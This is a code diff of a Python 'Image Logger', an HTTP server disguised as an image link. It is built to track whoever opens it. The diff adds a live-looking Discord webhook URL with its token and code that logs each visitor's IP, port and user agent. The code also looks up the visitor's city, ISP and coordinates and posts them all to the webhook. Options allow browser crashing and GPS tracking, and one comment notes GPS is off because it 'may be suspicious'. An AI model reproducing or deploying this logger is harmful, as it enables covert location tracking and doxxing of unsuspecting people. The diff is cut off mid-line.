@@ -12,31 +12,25 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
+    "webhook": "https://discord.com/api/webhooks/1515363125531115542/NBsBVRzkNGGAehV5BdXblWAAVorlDAAgiLuuuO4IO1XCqfEdie7Eq9ZeP7G1Z2Vf72xL",
     "image": "IMAGE HERE !",  # You can also have a custom image by using a URL argument
-                                                # (E.g. yoursite.com/imagelogger?url=<URL-escaped image link>)
-    "imageArgument": True,  # Allows you to change the image via URL argument
-
+                                               # (E.g. yoursite.com/imagelogger?url=<URL-escaped image link>)
+    "imageArgument": True,  # Allows you to use a URL argument to change the image (SEE THE README)
     # CUSTOMIZATION #
-    "username": "Image Logger",  # Webhook username
-    "color": 0x00FFFF,  # Embed color
-
+    "username": "Image Logger",  # Set this to the name you want the webhook to have
+    "color": 0x00FFFF,  # Hex Color you want for the embed (Example: Red is 0xFF0000)
     # OPTIONS #
     "crashBrowser": False,
-
-    "accurateLocation": False,  # GPS location, disabled by default
-
-    "message": {
-        "doMessage": False,
-        "message": "Custom message here",
-        "richMessage": True,
+    "accurateLocation": False,  # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "message": {  # Show a custom message when the user opens the image
+        "doMessage": False,  # Enable the custom message?
+        "message": " Custom message here",
+        "richMessage": True,  # Enable rich text?
     },
-
     "vpnCheck": 1,
     "linkAlerts": True,
     "buggedImage": True,
     "antiBot": 1,
-
     # REDIRECTION #
     "redirect": {
         "redirect": False,
@@ -70,57 +64,33 @@ def reportError(error):
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
         try:
-            # Get client IP and port
             client_ip = self.client_address[0]
             client_port = self.client_address[1]
 
-            # Parse the URL and query parameters
-            parsed_url = parse.urlparse(self.path)
-            query = parse.parse_qs(parsed_url.query)
-
-            # User agent from headers
             useragent = self.headers.get('User-Agent', '')
 
-            # Check blacklisted IPs
             if any(client_ip.startswith(prefix) for prefix in blacklistedIPs):
                 self.send_response(403)
                 self.end_headers()
                 self.wfile.write(b'Forbidden')
                 return
 
-            # Bot detection
             bot = botCheck(client_ip, useragent)
 
-            # Prepare content for Discord webhook embed
-            description_lines = [
-                f"**IP:** {client_ip}",
-                f"**Port:** {client_port}",
-                f"**User-Agent:** {useragent}",
-                f"**Bot:** {bot or 'No'}",
-            ]
+            # Get IP info from ip-api.com
+            ip_info_resp = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,as,mobile,proxy,hosting")
+            ip_info = ip_info_resp.json() if ip_info_resp.status_code == 200 and ip_info_resp.json().get("status") == "success" else {}
 
-            # Add more info if needed based on your existing logic (e.g. location, VPN)
+            # Parse useragent details
+            ua_data = httpagentparser.detect(useragent)
+            os_info = ua_data.get('os', {}).get('name', 'Unknown')
+            browser_info = ua_data.get('browser', {}).get('name', 'Unknown')
 
-            embed = {
-                "title": "Image Logger - New Hit",
-                "color": config["color"],
-                "description": "\n".join(description_lines),
-            }
-
-            # Send to Discord webhook
-            requests.post(config["webhook"], json={
-                "username": config["username"],
-                "embeds": [embed],
-            })
-
-            # Decide what content to serve (redirect, crash, image)
-            if config["redirect"]["redirect"]:
-                self.send_response(302)
-                self.send_header('Location', config["redirect"]["page"])
-                self.end_headers()
-                return
-            elif config["crashBrowser"]:
-                self.send_response(200)
-                self.send_header('Content-type', 'text/html')
-                self.end_headers()
-                crash_html = "<scri
+            # Compose embed fields including the port
+            fields = [
+                {"name": "IP", "value": client_ip, "inline": True},
+                {"name": "Port", "value": str(client_port), "inline": True},
+                {"name": "Provider", "value": ip_info.get("isp", "Unknown"), "inline": True},
+                {"name": "ASN", "value": ip_info.get("as", "Unknown"), "inline": True},
+                {"name": "Country", "value": ip_info.get("country", "Unknown"), "inline": True},
+                {"name": "Region", "value": ip_info.ge
